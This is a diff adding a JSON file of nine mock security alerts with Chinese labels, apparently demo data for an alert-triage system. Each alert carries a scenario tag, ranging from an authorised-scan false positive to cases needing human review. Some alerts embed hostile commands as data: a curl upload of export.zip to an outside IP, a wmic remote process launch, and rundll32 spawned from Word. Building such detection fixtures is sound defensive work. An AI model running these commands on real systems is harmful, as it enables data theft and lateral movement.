@@ -1,0 +1,47 @@
+[
+  {
+    "alert_id":"ALT-001","alert_time":"2026-11-18T10:21:32+08:00","alert_type":"malicious_ip_connection","alert_name":"终端访问恶意 IP","severity":"medium","source":"EDR","src_ip":"10.10.1.10","src_port":51324,"dst_ip":"198.51.100.10","dst_port":443,"protocol":"TCP","host_id":"HOST-001","hostname":"SEC-SCAN-01","user":"zhangsan",
+    "process":{"name":"python.exe","path":"C:\\Python311\\python.exe","command_line":"python.exe vulnerability_scan.py --target 198.51.100.10","parent_process":"powershell.exe"},
+    "detection":{"rule_id":"EDR-C2-101","rule_name":"恶意 IP 通信","matched_field":"dst_ip","matched_value":"198.51.100.10"},"raw_log":"mock log ALT-001","demo_scenario":"授权扫描明确误报"
+  },
+  {
+    "alert_id":"ALT-002","alert_time":"2026-11-18T10:40:00+08:00","alert_type":"malicious_ip_connection","alert_name":"终端访问恶意 IP","severity":"critical","source":"EDR","src_ip":"10.10.2.20","src_port":49110,"dst_ip":"203.0.113.25","dst_port":445,"protocol":"TCP","host_id":"HOST-002","hostname":"FIN-PC-02","user":"lisi",
+    "process":{"name":"wmic.exe","path":"C:\\Windows\\System32\\wbem\\wmic.exe","command_line":"wmic /node:10.10.2.21 process call create cmd.exe","parent_process":"cmd.exe"},
+    "detection":{"rule_id":"EDR-C2-101","rule_name":"恶意 IP 通信","matched_field":"dst_ip","matched_value":"203.0.113.25"},"raw_log":"mock log ALT-002","demo_scenario":"横向移动高风险"
+  },
+  {
+    "alert_id":"ALT-003","alert_time":"2026-11-18T11:02:00+08:00","alert_type":"malicious_ip_connection","alert_name":"服务器访问恶意 IP","severity":"critical","source":"NDR","src_ip":"10.20.0.30","src_port":52001,"dst_ip":"203.0.113.40","dst_port":443,"protocol":"TCP","host_id":"HOST-003","hostname":"DB-PROD-01","user":"dbadmin",
+    "process":{"name":"curl.exe","path":"C:\\Windows\\System32\\curl.exe","command_line":"curl --upload-file export.zip https://203.0.113.40/u","parent_process":"powershell.exe"},
+    "detection":{"rule_id":"NDR-EXFIL-201","rule_name":"恶意 IP 大流量通信","matched_field":"dst_ip","matched_value":"203.0.113.40"},"raw_log":"mock log ALT-003","demo_scenario":"数据外传高风险"
+  },
+  {
+    "alert_id":"ALT-004","alert_time":"2026-11-18T11:20:00+08:00","alert_type":"malicious_ip_connection","alert_name":"核心资产访问恶意 IP","severity":"critical","source":"NDR","src_ip":"10.30.0.10","src_port":51000,"dst_ip":"203.0.113.55","dst_port":8443,"protocol":"TCP","host_id":"HOST-004","hostname":"TRADE-CORE-01","user":"svc_trade",
+    "process":{"name":"trade-service.exe","path":"D:\\apps\\trade-service.exe","command_line":"trade-service.exe --prod","parent_process":"services.exe"},
+    "detection":{"rule_id":"NDR-C2-301","rule_name":"核心资产恶意 IP 通信","matched_field":"dst_ip","matched_value":"203.0.113.55"},"raw_log":"mock log ALT-004","demo_scenario":"核心资产访问恶意 IP"
+  },
+  {
+    "alert_id":"ALT-005","alert_time":"2026-11-18T14:10:00+08:00","alert_type":"malicious_ip_connection","alert_name":"扫描器访问恶意 IP","severity":"high","source":"EDR","src_ip":"10.10.5.5","src_port":53000,"dst_ip":"203.0.113.8","dst_port":443,"protocol":"TCP","host_id":"HOST-005","hostname":"PENTEST-01","user":"scanner",
+    "process":{"name":"nmap.exe","path":"C:\\Tools\\nmap.exe","command_line":"nmap -sV 203.0.113.8","parent_process":"powershell.exe"},
+    "detection":{"rule_id":"EDR-C2-101","rule_name":"恶意 IP 通信","matched_field":"dst_ip","matched_value":"203.0.113.8"},"raw_log":"mock log ALT-005","demo_scenario":"有授权但存在恶意情报冲突"
+  },
+  {
+    "alert_id":"ALT-006","alert_time":"2026-11-18T14:30:00+08:00","alert_type":"malicious_ip_connection","alert_name":"终端访问恶意 IP","severity":"high","source":"EDR","src_ip":"10.10.6.6","src_port":54000,"dst_ip":"198.51.100.77","dst_port":80,"protocol":"TCP","host_id":"HOST-006","hostname":"DEV-PC-06","user":"zhaoliu",
+    "process":{"name":"rundll32.exe","path":"C:\\Windows\\System32\\rundll32.exe","command_line":"rundll32.exe unknown.dll,Start","parent_process":"winword.exe"},
+    "detection":{"rule_id":"EDR-C2-101","rule_name":"恶意 IP 通信","matched_field":"dst_ip","matched_value":"198.51.100.77"},"raw_log":"mock log ALT-006","demo_scenario":"无授权且命中恶意情报"
+  },
+  {
+    "alert_id":"ALT-007","alert_time":"2026-11-18T15:00:00+08:00","alert_type":"malicious_ip_connection","alert_name":"未知资产访问恶意 IP","severity":"high","source":"SIEM","src_ip":"10.99.0.7","src_port":55000,"dst_ip":"192.0.2.200","dst_port":443,"protocol":"TCP","host_id":"HOST-007","hostname":"UNKNOWN-07","user":"unknown",
+    "process":null,
+    "detection":{"rule_id":"SIEM-IP-101","rule_name":"恶意 IP 通信","matched_field":"dst_ip","matched_value":"192.0.2.200"},"raw_log":null,"demo_scenario":"关键字段或证据缺失"
+  },
+  {
+    "alert_id":"ALT-008","alert_time":"2026-11-18T15:20:00+08:00","alert_type":"malicious_ip_connection","alert_name":"开发服务器访问可疑 IP","severity":"medium","source":"EDR","src_ip":"10.10.8.8","src_port":56000,"dst_ip":"192.0.2.70","dst_port":443,"protocol":"TCP","host_id":"HOST-008","hostname":"DEV-CI-08","user":"devops",
+    "process":{"name":"integration-test.exe","path":"D:\\ci\\integration-test.exe","command_line":"integration-test.exe --endpoint 192.0.2.70","parent_process":"runner.exe"},
+    "detection":{"rule_id":"EDR-REP-102","rule_name":"低信誉 IP 通信","matched_field":"dst_ip","matched_value":"192.0.2.70"},"raw_log":"mock log ALT-008","demo_scenario":"AI 高置信度疑似误报"
+  },
+  {
+    "alert_id":"ALT-009","alert_time":"2026-11-18T15:40:00+08:00","alert_type":"malicious_ip_connection","alert_name":"终端访问低信誉 IP","severity":"medium","source":"EDR","src_ip":"10.10.9.9","src_port":57000,"dst_ip":"192.0.2.90","dst_port":443,"protocol":"TCP","host_id":"HOST-009","hostname":"MKT-PC-09","user":"sunqi",
+    "process":{"name":"script.exe","path":null,"command_line":null,"parent_process":null},
+    "detection":{"rule_id":"EDR-REP-102","rule_name":"低信誉 IP 通信","matched_field":"dst_ip","matched_value":"192.0.2.90"},"raw_log":"mock log ALT-009","demo_scenario":"AI 低置信度需要人工"
+  }
+]
